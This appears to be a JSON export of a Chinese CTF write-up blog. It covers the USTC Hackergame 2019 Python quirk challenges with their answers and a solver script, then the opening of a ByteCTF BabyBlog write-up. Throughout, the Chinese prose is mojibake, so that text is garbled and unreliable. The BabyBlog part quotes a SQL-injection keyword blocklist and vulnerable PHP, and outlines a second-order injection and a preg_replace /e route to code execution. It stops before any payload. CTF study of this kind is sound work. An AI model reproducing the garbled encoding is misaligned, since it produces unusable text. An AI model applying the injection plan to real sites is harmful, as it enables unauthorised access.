money,loser~ï¼Œåˆç†çŒœæµ‹ä¸€ä¸‹ç”¨çš„æ˜¯strcmpï¼Œé‚£ä¹ˆç›´æ¥money[]=1å°±å¯ä»¥äº†ã€‚ ç„¶åå°±è¿”å›flagäº†ã€‚ flag{adb90540-9332-4480-a8d7-3d250841adff}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"}]},{"title":"USTC-Hackergame-2019-ä¸åŒå¯»å¸¸çš„Pythonè€ƒè¯•","slug":"USTC-Hackergame-2019-ä¸åŒå¯»å¸¸çš„Pythonè€ƒè¯•","date":"2019-11-17T04:46:13.000Z","updated":"2019-12-10T12:15:12.676Z","comments":true,"path":"2019/11/17/USTC-Hackergame-2019-ä¸åŒå¯»å¸¸çš„Pythonè€ƒè¯•/","link":"","permalink":"http://tiaonmmn.github.io/2019/11/17/USTC-Hackergame-2019-%E4%B8%8D%E5%90%8C%E5%AF%BB%E5%B8%B8%E7%9A%84Python%E8%80%83%E8%AF%95/","excerpt":"USTC Hackergame 2019çš„ä¸€é“é¢˜ã€‚ çœ‹æºç å§ï¼š","text":"USTC Hackergame 2019çš„ä¸€é“é¢˜ã€‚ çœ‹æºç å§ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213#!/usr/bin/env python3import astimport signalimport tracebackfrom copy import deepcopyRED = &quot;\\033[31m&quot;GREEN = &quot;\\033[32m&quot;YELLOW = &quot;\\033[33m&quot;END = &quot;\\033[0m&quot;def timeout(*args, **kwargs): print(&quot;Timeout!&quot;) exit(-1)class Challenges: def __init__(self): signal.signal(signal.SIGALRM, timeout) self.challenges = &#123;&#125; self.cleared = &#123;&#125; for method in dir(self): if method.startswith(&quot;challenge_&quot;): n = int(method.split(&quot;_&quot;)[-1]) self.challenges[n] = getattr(self, method) self.cleared[n] = False def do_challenge(self, n): while True: inp = input(&quot;Your answer: &quot;) if len(inp) &gt; 100: print(&quot;Input too long&quot;) continue try: answer = ast.literal_eval(inp) break except Exception: print(&quot;Invalid input!&quot;) continue signal.alarm(1) print(YELLOW, end=&quot;&quot;) try: if self.challenges[n](answer): print(f&quot;Challenge &#123;n:02d&#125; cleared!&quot;) self.cleared[n] = True else: print(f&quot;Challenge &#123;n:02d&#125; failed!&quot;) except Exception: print(traceback.format_exc(), end=&quot;&quot;) print(END, end=&quot;&quot;) signal.alarm(0) def show_status(self): print() print(&quot;------ Do you know Python? ------&quot;) for i, (challenge, cleared) in enumerate(sorted(self.cleared.items())): color = GREEN if cleared else RED text = &quot;Y&quot; if cleared else &quot;N&quot; print(color + f&quot;&#123;challenge:02d&#125;: &#123;text&#125;&quot; + END, end=&quot; &quot;) if i % 5 == 4: print() print() def cleared_count(self): return sum(self.cleared.values()) def total_count(self): return len(self.challenges) def challenge_1(self, answer): if answer == &quot;Hello&quot;: return True def challenge_2(self, answer): a, b, c, d = answer if a == b and a is b and c == d and c is not d: return True def challenge_3(self, answer): if answer in answer == answer: return True def challenge_4(self, answer): a1, b1 = answer a2, b2 = answer if a1 * 2 != a1 and b1 * 2 != b1: a1 *= 2 b1 *= 2 if a1 == a2 and b1 != b2: return True def challenge_5(self, answer): r = reversed([1, 2, 3]) if list(r) == list(r) + answer: return True def challenge_6(self, answer): a, b = answer if max(a, b) != max(b, a): return True def challenge_7(self, answer): a, b, c = answer for x in a, b, c: if isinstance(x, float) or isinstance(x, complex): return False if a * (b + c) != a * b + a * c: return True def challenge_8(self, answer): a, b, c = answer for x in a, b, c: if isinstance(x, float) or isinstance(x, complex): return False if a * (b * c) != (a * b) * c: return True def challenge_9(self, answer): a, b = answer for x in a, b: if isinstance(x, float) or isinstance(x, complex): return False if type(a ** b) != type(b ** a): return True def challenge_10(self, answer): a, b = answer if a and a.count(b) &gt; len(a): return True def challenge_11(self, answer): if max(answer) != max(*answer): return True def challenge_12(self, answer): a, b = answer if a &lt; b and all(x &gt; y for x, y in zip(a, b)): return True def challenge_13(self, answer): a, b = answer if b and not (a ^ b) - a: return True def challenge_14(self, answer): backup = deepcopy(answer) try: answer[0] += answer[1] except: if backup != answer: return True def challenge_15(self, answer): item, l = answer if item in l and not min(l) &lt;= item &lt;= max(l): return True def challenge_16(self, answer): item, l = answer if item == 233 and item in l and l in l: return True def challenge_17(self, answer): item, l = answer if l[0] == item and item not in l: return True def challenge_18(self, answer): a, b = answer if (a - b) != -(b - a): return True def challenge_19(self, answer): if answer.isdecimal(): if len(answer) &lt; 5: if sum(ord(c) - ord(&quot;0&quot;) for c in answer) == 23333: return True def challenge_20(self, answer): if len(set(str(x) for x in answer)) == 7 and all(x == 0 for x in answer): return Trueif __name__ == &quot;__main__&quot;: c = Challenges() while True: c.show_status() inp = input(&quot;Which one do you want to play? &quot;) try: n = int(inp) except ValueError: print(&quot;Invalid input!&quot;) continue if n not in c.challenges: print(&quot;Challenge not found!&quot;) continue c.do_challenge(n) print(f&quot;Your progress: &#123;c.cleared_count()&#125;/&#123;c.total_count()&#125;&quot;) if c.cleared_count() == c.total_count(): print(&quot;You are the master of Python.&quot;) print(&quot;Here is the final flag:&quot;) print(open(&quot;flag3&quot;).read().strip()) break elif c.cleared_count() &gt;= c.total_count() * 3 // 4: print(open(&quot;flag2&quot;).read().strip()) elif c.cleared_count() &gt;= c.total_count() // 2: print(open(&quot;flag1&quot;).read().strip()) else: print(&quot;Go on to get your flags!&quot;) æ˜æ˜¾Python3ç‰ˆæœ¬ï¼Œè¿™æ®µä»£ç æ ¸å¿ƒå°±æ˜¯ç”¨ast.literal_evalè®¡ç®—æˆ‘ä»¬çš„è¾“å…¥ï¼Œä¸æ¯ä¸€Challengeçš„è¦æ±‚ç›¸æ¯”è¾ƒï¼Œç›¸ç­‰å°±é€šè¿‡ã€‚è¾“å…¥ä¸èƒ½è¶…è¿‡100ä¸ªå­—ç¬¦ã€‚é‚£å°±ä¸€ä¸ªä¸€ä¸ªçœ‹å§ï¼š 01 å­—ç¬¦ä¸²æ¯”è¾ƒ 123def challenge_1(self, answer): if answer == &quot;Hello&quot;: return True è¿™ä¸ªå¾ˆç®€å•ï¼Œæˆ‘ä»¬è¾“å…¥'Hello'ï¼Œè¾“å…¥ä¼šè¢«å¤„ç†æˆå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²æ¯”è¾ƒã€‚ 02 ==ä¸is 1234def challenge_2(self, answer): a, b, c, d = answer if a == b and a is b and c == d and c is not d: return True æˆ‘ä»¬è¦è¾“å…¥ä¸€ä¸ªlistæˆ–tupleï¼Œåˆ†åˆ«èµ‹å€¼a b c dï¼Œè¦æ±‚a==bï¼Œaä¸bä¸ºåŒä¸€å¯¹è±¡ï¼Œc==dï¼Œcä¸dä¸ä¸ºåŒä¸€å¯¹è±¡ã€‚è¿™é‡Œå°±å¤šè§£äº†ï¼ŒPython3ä¸­charå‹æ•´æ•°æ˜¯ç¼“å­˜çš„ï¼ˆå‚è€ƒè¿™é‡Œï¼‰ï¼Œå› æ­¤1 is 1ã€‚ç„¶åPythonæ¯”è¾ƒæ•°å­—çš„æ—¶å€™æ²¡æœ‰è¦æ±‚ä¸¤æ•°å­—ä¸ºåŒä¸€ç±»å‹ï¼ˆå‚è€ƒè¿™é‡Œï¼‰ï¼Œå› æ­¤1==1.0ï¼Œä½†æ˜¯floatç±»å‹æ˜¯ä¸ä¼šç¼“å­˜çš„ï¼Œå› æ­¤1 is not 1.0ã€‚ç¬¬äºŒä¸ªåˆ¤æ–­è¿˜å¯ä»¥ç”¨ä»»ä½•å¯å˜ç±»å‹ï¼Œå¦‚[1]==[1]ï¼Œ[1] is not [1]ã€‚ç¤ºä¾‹ç­”æ¡ˆï¼š[1,1,2,2.0] 03 inçš„è¿ç®—ç¬¦ä¼˜å…ˆçº§ 123def challenge_3(self, answer): if answer in answer == answer: return True Python3ä¸­inå’Œ==åŒæ—¶ä½¿ç”¨ä¼šæ€æ ·ï¼Ÿæ‰¾ä¸€ä¸‹è¿ç®—ç¬¦ä¼˜å…ˆçº§ï¼Œå‘ç°inæ˜¯åäº==è®¡ç®—çš„ï¼Œå› æ­¤é‚£ä¸ªifå¯ä»¥æ”¹å†™æˆï¼šif (answer==answer) and (answer in answer):ï¼Œä»»æ„å­—ç¬¦ä¸²éƒ½å¯ä»¥æ»¡è¶³ä¸Šè¿°æ¡ä»¶ã€‚ 04 Unpackä¸å¯¹è±¡å†…å­˜åœ°å€ 12345678def challenge_4(self, answer): a1, b1 = answer a2, b2 = answer if a1 * 2 != a1 and b1 * 2 != b1: a1 *= 2 b1 *= 2 if a1 == a2 and b1 != b2: return True é¦–å…ˆæ˜ç¡®ä¸€ç‚¹ï¼Œiterableå¯¹è±¡answeråœ¨unpackçš„æ—¶å€™a1,a2 b1,b2å…·æœ‰ç›¸åŒçš„å†…å­˜åœ°å€ã€‚é‚£ä¹ˆè¿™é¢˜å°±ç®€å•äº†ï¼šè¦æ±‚a1åœ¨*2ååœ°å€ä¿æŒä¸å˜ï¼Œè€Œa2*2ååœ°å€è¦æ”¹å˜ã€‚éšä¾¿æ‰¾ä¸ªlistå’Œintå°±è¡Œï¼š[[2],2]ã€‚ 05 reversedä¸iterator 1234def challenge_5(self, answer): r = reversed([1, 2, 3]) if list(r) == list(r) + answer: return True reversed()å‡½æ•°æ–‡æ¡£åœ¨è¿™é‡Œï¼Œå®ƒè¿”å›ä¸€ä¸ªiteratorï¼ŒåŒ…å«é€†åºæ’åˆ—è¿‡çš„å…ƒç´ ï¼Œä½†æ˜¯Python3çš„iteratoråœ¨è®¿é—®å®Œå…¨éƒ¨å…ƒç´ åä¼šå˜ç©ºï¼Œå› æ­¤ifåˆ¤æ–­çš„ç¬¬äºŒä¸ªlist(r)æ˜¯ç©ºçš„ï¼Œæˆ‘ä»¬ç»™ä¸ª[3,2,1]å°±å¯ä»¥æ»¡è¶³æ¡ä»¶ã€‚ 06 maxä¸é›†åˆ 1234def challenge_6(self, answer): a, b = answer if max(a, b) != max(b, a): return True max()è¿”å›å‚æ•°ä¸­æœ€å¤§å€¼ï¼Œä½†æ˜¯å¯¹äºsetè€Œè¨€ï¼Œä¸åƒlistç­‰å¯¹è±¡ï¼Œmax()åº”ç”¨äºé›†åˆä¸Šä¼šè¿”å›æ›´å…¨çš„é›†åˆï¼Œå¦‚aæ˜¯bçš„çœŸå­é›†ï¼Œè¿”å›bï¼Œå¦‚æœa bæ²¡æœ‰äº¤é›†åˆ™è¿”å›å…ƒç´ æœ€å¤šçš„é›†åˆï¼Œå¦‚a bå…ƒç´ ä¸ªæ•°ç›¸åŒä¸”æ²¡æœ‰äº¤é›†ï¼Œåˆ™è¿”å›ç¬¬ä¸€ä¸ªé›†åˆã€‚å› æ­¤ä»»æ„ç»™ä¸¤ä¸ªé›†åˆå°±å¯ä»¥äº†ï¼š[&#123;1&#125;,&#123;2&#125;]ã€‚ 07 + * 1234567def challenge_7(self, answer): a, b, c = answer for x in a, b, c: if isinstance(x, float) or isinstance(x, complex): return False if a * (b + c) != a * b + a * c: return True ä¸å…è®¸ä½¿ç”¨floatå’Œcomplexï¼Œè¦æ±‚ä¸æ»¡è¶³ä¹˜æ³•åˆ†é…å¾‹ã€‚Pythonä¸­+å’Œ*å¯ä»¥å¯¹iterableå¯¹è±¡ä½¿ç”¨ï¼Œå¦‚æœb cä¸ºä¸åŒå­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥æ»¡è¶³æ¡ä»¶äº†ï¼š[2,'a','b']ã€‚ 08 + * Ver 2 1234567def challenge_8(self, answer): a, b, c = answer for x in a, b, c: if isinstance(x, float) or isinstance(x, complex): return False if a * (b * c) != (a * b) * c: return True è·Ÿä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œè¦æ±‚ä¸èƒ½æ»¡è¶³ä¹˜æ³•ç»“åˆå¾‹ã€‚Pythonä¸­*è¿˜å¯ä»¥å‡ºç°è´Ÿæ•°ï¼Œ0æˆ–è´Ÿæ•°æ—¶ç»“æœä¼šå˜ç©ºï¼š[\"a\",-1,-2]ã€‚ 09 ** 1234567def challenge_9(self, answer): a, b = answer for x in a, b: if isinstance(x, float) or isinstance(x, complex): return False if type(a ** b) != type(b ** a): return True è¦æ±‚a**bå’Œb**aç»“æœçš„ç±»å‹ä¸ä¸€è‡´ã€‚ç”¨çš„æ˜¯**ï¼Œè®¡ç®—Næ¬¡å¹‚ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°pow(-1,2)==1ï¼Œpow(2,-1)==0.5ã€‚ä¸¤ä¸ªæ•°æ®ç±»å‹ä¸ä¸€è‡´ã€‚ 10 count 1234def challenge_10(self, answer): a, b = answer if a and a.count(b) &gt; len(a): return True å­—ç¬¦ä¸²ã€byteså’Œbytearrayæœ‰countå‡½æ•°ï¼Œa.count(b)è¿”å›aä¸­åŒ…å«çš„bçš„ä¸ªæ•°ã€‚bå¯ä»¥ä¸ºç©ºï¼Œé‚£ä¹ˆè¿”å›çš„ç»“æœå°±ä¼šå˜æˆlen(a)+1ã€‚ 11 max Ver 2 123def challenge_11(self, answer): if max(answer) != max(*answer): return True max()å‡½æ•°å¯ä»¥ç›´æ¥æ¥å‚æ•°å¦‚max(1,2,3)ï¼Œä¹Ÿå¯ä»¥æ¥ä¸€ä¸ªlistï¼Œå¦‚max([1,2,3])ï¼Œmax()æ¥listçš„æ—¶å€™ä¼šè‡ªåŠ¨è¿­ä»£ï¼Œè¿”å›æœ€å¤§çš„å…ƒç´ ï¼Œé‚£ä¹ˆmax([[2]])ä¼šè¿”å›[2]ï¼Œè€Œ*ä¼šè‡ªåŠ¨è¿­ä»£ï¼Œmax(*[[2]])==max([2])==2ã€‚æ˜¾ç„¶ä¸¤ä¸ªå¹¶ä¸ç›¸ç­‰ã€‚ 12 all zip 1234def challenge_12(self, answer): a, b = answer if a &lt; b and all(x &gt; y for x, y in zip(a, b)): return True è¦æ±‚aæ¯”bå°ï¼ŒåŒæ—¶all()æ»¡è¶³æ¡ä»¶ï¼Œå…¶ä¸­a,bç”¨zip()ç»„åˆï¼Œç„¶åè¦æ±‚a&gt;bã€‚å¦‚æœaä¸ºç©ºlistï¼Œé‚£ä¹ˆzip()å°±ä¼šå˜æˆç©ºlistï¼Œall([])ä¸ºTrueã€‚ 13 ^ - 1234def challenge_13(self, answer): a, b = answer if b and not (a ^ b) - a: return True è¦æ±‚(a^b)-a==0ï¼Œb!=0ã€‚ä½†è¿™ä¸æˆç«‹ï¼Œå› æ­¤å‚è€ƒç¬¬6é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨é›†åˆã€‚é‚£ä¹ˆa båŒä¸º{1}å³å¯ã€‚ 14 += 1234567def challenge_14(self, answer): backup = deepcopy(answer) try: answer[0] += answer[1] except: if backup != answer: return True è¦æ±‚answer[0]+=answer[1]è§¦å‘å¼‚å¸¸ï¼ŒåŒæ—¶backupä¸ä¸answerç›¸åŒã€‚è¿™ä¸ªæ˜¯çœŸçš„ä¸çŸ¥é“äº†ï¼Œå‚è€ƒè¿™ä¸ªï¼Œç®€å•æ¥è¯´å°±æ˜¯+å¯ä»¥æ­£å¸¸æ‰§è¡Œï¼Œä½†æ˜¯=ä¼šå‡ºç°é—®é¢˜ç„¶è€Œanswerçš„å†…å®¹è¿˜æ˜¯æ”¹å˜äº†ã€‚å› æ­¤ä¼ ä¸€ä¸ª([2],[3])å°±å¯ä»¥äº†ã€‚ 15 &gt;&lt; 1234def challenge_15(self, answer): item, l = answer if item in l and not min(l) &lt;= item &lt;= max(l): return True itemè¦åœ¨lä¸­ï¼Œä¸”ä¸æ»¡è¶³min(l) &lt;= item &lt;= max(l)ï¼Œmax()å¯ä»¥æ¥iterableå¯¹è±¡ï¼Œä¾‹å¦‚å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆmax('1234')ä¸º4ï¼Œmin('1234')ä¸º1ï¼Œè¿”å›çš„éƒ½æ˜¯å•å­—ç¬¦ã€‚é‚£ä¹ˆå½“lä¸º\"1111\"ï¼Œitemä¸º'11'çš„æ—¶å€™ï¼Œmin maxè¿”å›1ï¼Œ\"1\"&lt;\"11\"ã€‚ 16 bytes 1234def challenge_16(self, answer): item, l = answer if item == 233 and item in l and l in l: return True è¦æ±‚item==233ï¼Œitem in lå’Œl in lã€‚iterableçš„å¯¹è±¡å¯ä»¥inï¼Œå­—ç¬¦ä¸²å¯ä»¥ï¼Œä½†æ˜¯itemæ˜¯intï¼Œintä¸èƒ½in stringã€‚Python3ä¸­é™¤äº†å­—ç¬¦ä¸²ï¼Œè¿˜æœ‰ä»¤äººç—›æ¨çš„bytesï¼Œintå¯ä»¥in bytesï¼š[233,b'\\xe9']ã€‚ 17 dict [] 1234def challenge_17(self, answer): item, l = answer if l[0] == item and item not in l: return True è¦æ±‚l[0]==itemåŒæ—¶itemä¸åœ¨lã€‚èƒ½ç”¨[]çš„å¯¹è±¡æ˜¯Subscriptableçš„ï¼Œé»˜è®¤æƒ…å†µä¸‹ç›®å‰åŒ…æ‹¬ï¼šå­—ç¬¦ä¸² å…ƒç»„ åˆ—è¡¨ å­—å…¸ã€‚é‚£ä¹ˆç”¨å­—å…¸å‘¢ï¼Ÿl==2,item={0:2}ï¼Œint(2)ä¸åœ¨dict({0:2})é‡Œï¼Œitem[0]==2ï¼Œæ»¡è¶³æ¡ä»¶ã€‚ 18 inf nan 1234def challenge_18(self, answer): a, b = answer if (a - b) != -(b - a): return True listç­‰ç±»å‹ä¸æ”¯æŒ-ï¼Œé€šå¸¸çš„int floatä¹Ÿæ²¡åŠæ³•æ»¡è¶³æ¡ä»¶ã€‚ç„¶åæƒ³åˆ°NaNå’ŒInfã€‚inf-inf==nanï¼Œnan!=nanã€‚ä½†æ˜¯infæ²¡æ³•è¾“å…¥ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨1e2345æ¥æ„é€ ã€‚ 19 Unicode 12345def challenge_19(self, answer): if answer.isdecimal(): if len(answer) &lt; 5: if sum(ord(c) - ord(&quot;0&quot;) for c in answer) == 23333: return True è¿™ä¸ªå°±ç®€å•äº†ï¼Œå­—ç¬¦ä¸ä¸€å®šæ˜¯ASCIIé›†ï¼ŒUnicodeä¹Ÿå¯ä»¥ã€‚è·‘è„šæœ¬å¥½äº†ã€‚ 123456789101112131415161718import sysimport iosys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding=&#x27;utf-8&#x27;)result=[]for a in range(0xffff): if(chr(a).isdecimal()): result.append(a)for a in result: for b in result: for c in result: for d in result: if (a + b + c + d - ord(&#x27;0&#x27;) * 4 == 23333): print(&quot;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&quot;.format(a, b, c, d)) # print(chr(a) + chr(b) + chr(c) + chr(d)) if ((chr(a) + chr(b) + chr(c) + chr(d)).isdecimal()): print(&quot;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&quot;.format(a, b, c, d)) print(&quot;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&quot;.format(a, b, c, d, chr(a), chr(b), chr(c), chr(d))) 20 int string bool complex float 123def challenge_20(self, answer): if len(set(str(x) for x in answer)) == 7 and all(x == 0 for x in answer): return True è¦æ‰¾7ç§ä¸åŒçš„å…ƒç´ ï¼Œå¹¶ä¸”éƒ½ç­‰äº0ã€‚ é¦–å…ˆæƒ³åˆ°0 False 0.0 0+0jï¼Œç„¶åæ³¨æ„åˆ°ä»–æ˜¯ç”¨çš„str()ï¼Œstr(-0.0)=='-0.0'ï¼Œstr(0.0)=='0.0'ï¼Œ-0.0==0.0==0ã€‚é‚£ä¹ˆå†åŠ ä¸€ä¸ª-0.0ã€‚åŒæ ·çš„-0.0-0jä¹Ÿè¡Œï¼Œ-0.0jã€‚ flag{023a745e-c1d4-4a60-8bb0-8fa6d567b264}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/tags/Misc/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"}]},{"title":"BUUOJåˆ·é¢˜-Web-BabyBlog","slug":"BUUOJåˆ·é¢˜-Web-BabyBlog","date":"2019-10-29T08:38:22.000Z","updated":"2020-03-05T07:10:15.606Z","comments":true,"path":"2019/10/29/BUUOJåˆ·é¢˜-Web-BabyBlog/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/29/BUUOJ%E5%88%B7%E9%A2%98-Web-BabyBlog/","excerpt":"ByteCTF 2019çš„BabyBlogã€‚ æ‰«ç›®å½•å‘ç°æœ‰www.zipï¼Œé‚£å°±çœ‹æºç å§ã€‚ config.phpé‡Œæœ‰ä¸ªSafeFilter()ã€‚","text":"ByteCTF 2019çš„BabyBlogã€‚ æ‰«ç›®å½•å‘ç°æœ‰www.zipï¼Œé‚£å°±çœ‹æºç å§ã€‚ config.phpé‡Œæœ‰ä¸ªSafeFilter()ã€‚ 12345678910111213function SafeFilter(&amp;$arr)&#123; foreach ($arr as $key =&gt; $value) &#123; if (!is_array($value)) &#123; $filter = &quot;benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|load_file\\s*?\\\\(|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)&#x27;\\&quot;\\\\d]+?=[\\\\(\\\\)&#x27;\\&quot;\\\\d]+?|[\\\\(\\\\)&#x27;\\&quot;a-zA-Z]+?=[\\\\(\\\\)&#x27;\\&quot;a-zA-Z]+?|&gt;|&lt;|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\&quot;&#x27;])|\\\\/\\\\*.*\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT\\s*(\\(.+\\)\\s*|@&#123;1,2&#125;.+?\\s*|\\s+?.+?|(`|&#x27;|\\&quot;).*?(`|&#x27;|\\&quot;)\\s*)|UPDATE\\s*(\\(.+\\)\\s*|@&#123;1,2&#125;.+?\\s*|\\s+?.+?|(`|&#x27;|\\&quot;).*?(`|&#x27;|\\&quot;)\\s*)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)@&#123;0,2&#125;(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?|(`|&#x27;|\\&quot;).*?(`|&#x27;|\\&quot;)|(\\+|-|~|!|@:=|&quot; . urldecode(&#x27;%0B&#x27;) . &quot;).+?)FROM(\\\\(.+\\\\)|\\\\s+?.+?|(`|&#x27;|\\&quot;).*?(`|&#x27;|\\&quot;))|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)&quot;; if (preg_match(&#x27;/&#x27; . $filter . &#x27;/is&#x27;, $value)) &#123; exit(&quot;&lt;script&gt;alert(&#x27;Failure!Do not use sensitive words.&#x27;);location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;); &#125; &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125;&#125; Banäº†ä¸€å¤§å †SQLæ³¨å…¥ç”¨çš„å…³é”®å­—ã€‚ç„¶åå°±æ˜¯writing.phpè´Ÿè´£æ·»åŠ æ–‡ç« ï¼Œedit.phpè´Ÿè´£ç¼–è¾‘æ–‡ç« ã€‚ç„¶ååœ¨edit.phpé‡Œæœ‰å‡ è¡Œï¼š 12345678910if (isset($_POST[&#x27;title&#x27;]) &amp;&amp; isset($_POST[&#x27;content&#x27;]) &amp;&amp; isset($_POST[&#x27;id&#x27;])) &#123; foreach ($sql-&gt;query(&quot;select * from article where id=&quot; . intval($_POST[&#x27;id&#x27;]) . &quot;;&quot;) as $v) &#123; $row = $v; &#125; if ($_SESSION[&#x27;id&#x27;] == $row[&#x27;userid&#x27;]) &#123; $title = addslashes($_POST[&#x27;title&#x27;]); $content = addslashes($_POST[&#x27;content&#x27;]); $sql-&gt;query(&quot;update article set title=&#x27;$title&#x27;,content=&#x27;$content&#x27; where title=&#x27;&quot; . $row[&#x27;title&#x27;] . &quot;&#x27;;&quot;); exit(&quot;&lt;script&gt;alert(&#x27;Edited successfully.&#x27;);location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;); &#125; update articleçš„titleç›´æ¥ç”¨çš„\\(row[&#39;title&#39;]ï¼Œè€Œ\\)rowæ˜¯é€šè¿‡SQLæŸ¥è¯¢èµ‹çš„å€¼ï¼Œè¿™é‡Œå¯èƒ½é€ æˆäºŒæ¬¡æ³¨å…¥ï¼Œä½†æ˜¯ç›®å‰è¿˜ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ã€‚replace.phpè²Œä¼¼ä¹Ÿæ˜¯ä¿®æ”¹çš„é¡µé¢ï¼Œä¸è¿‡åŠ äº†ä¸ªVIPæ¡ä»¶é™åˆ¶ï¼Œä»¥åŠæœ‰ä¸€è¡Œå¾ˆæœ‰è¶£çš„ä¸œè¥¿ï¼š 12345if ($_SESSION[&#x27;id&#x27;] == $row[&#x27;userid&#x27;]) &#123; if (isset($_POST[&#x27;regex&#x27;]) &amp;&amp; $_POST[&#x27;regex&#x27;] == &#x27;1&#x27;) &#123; $content = addslashes(preg_replace(&quot;/&quot; . $_POST[&#x27;find&#x27;] . &quot;/&quot;, $_POST[&#x27;replace&#x27;], $row[&#x27;content&#x27;])); $sql-&gt;query(&quot;update article set content=&#x27;$content&#x27; where id=&quot; . $row[&#x27;id&#x27;] . &quot;;&quot;); exit(&quot;&lt;script&gt;alert(&#x27;Replaced successfully.&#x27;);location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;); preg_replaceï¼Ÿå¹¶ä¸”patternæˆ‘ä»¬å¯æ§ï¼Œå¦‚æœä¼ ä¸ª/eå°±RCEäº†ã€‚æˆ‘ä»¬ç›®æ ‡å…ˆå®šè¿™é‡Œï¼Œè¦æ‹¿åˆ°VIPã€‚register.phpé‡Œè¡¨æ˜äº†å¦‚ä½•æˆä¸ºvipã€‚ 123456789if (!isset($row[&#x27;id&#x27;])) &#123; $password = md5($_POST[&#x27;password&#x27;]); $sql-&gt;query(&quot;insert into users (username,password,isvip) values (&#x27;$username&#x27;, &#x27;$password&#x27;,0);&quot;); foreach ($sql-&gt;query(&quot;select id from users where username=&#x27;$username&#x27;;&quot;) as $v) &#123; $row = $v; &#125; $sql-&gt;query(&quot;insert into article (userid,title,content) values (&quot; . $row[&#x27;id&#x27;] . &quot;, &#x27;Hello, world!&#x27;,&#x27;Welcome to babyblog. This is your first post. Edit or delete it, then start blogging!&#x27;);&quot;); exit(&quot;&lt;script&gt;alert(&#x27;Register successful.&#x27;);location.href=&#x27;login.php&#x27;;&lt;/script&gt;&quot;); &#125; çœ‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡é‚£ä¸ªäºŒæ¬¡æ³¨å…¥æ¥å¾—åˆ°æ‹¥æœ‰isvipæƒé™çš„ç”¨æˆ·ï¼Œå› ä¸ºupdateè¯­å¥çš„è¡¨å·²ç»å®šä¸‹ï¼Œæ˜¯æ²¡æ³•ä¿®æ”¹çš„ï¼Œåªèƒ½æŸ¥è¯¢ï¼ˆå¯ä»¥ç”¨å †å æ³¨å…¥ï¼‰ã€‚å› æ­¤æ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š graph TD A[&quot;writing.phpå†™ä¸€ç¯‡TitleåŒ…å«æˆ‘ä»¬æ¶æ„Payloadçš„æ–‡ç« &quot;] --&gt; B B[&quot;edit.phpä¿®æ”¹åˆšæ‰çš„æ–‡ç« ï¼Œä¿®æ”¹contentï¼Œå¯¼è‡´æ¶æ„Payloadç›´æ¥å¸¦å…¥updateï¼Œå®Œæˆæ³¨å…¥&quot;] --&gt; C C[&quot;æ³¨å…¥æˆåŠŸæ—¶contentä¼šæ”¹å˜ï¼Œå¦åˆ™å°±ä¸å˜&quot;] æˆ‘ä»¬çš„$row['title']è¢«æ”¾åœ¨whereå­å¥é‡Œï¼Œå› æ­¤åˆ©ç”¨MySQLçš„ç‰¹æ€§ï¼š ç„¶åè¿”å›çœ‹SafeFilterï¼Œè¿‡æ»¤äº†ä¸€å †å…³é”®å­—ï¼Œä½†æ˜¯ascii substrå•¥çš„éƒ½è¿˜ç•™ç€ï¼Œä»¥åŠ^ï¼Œå°±å¯ä»¥ç”¨å¼‚æˆ–æ³¨å…¥äº†ï¼Œå…·ä½“è¯·å‚è€ƒè¿™é‡Œï¼Œç®€å•æ¥è¯´å°±æ˜¯and orçš„æ›¿ä»£ï¼Œæ¡ä»¶é—´çš„çœŸå‡è¿›è¡Œå¼‚æˆ–è¿ç®—ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š 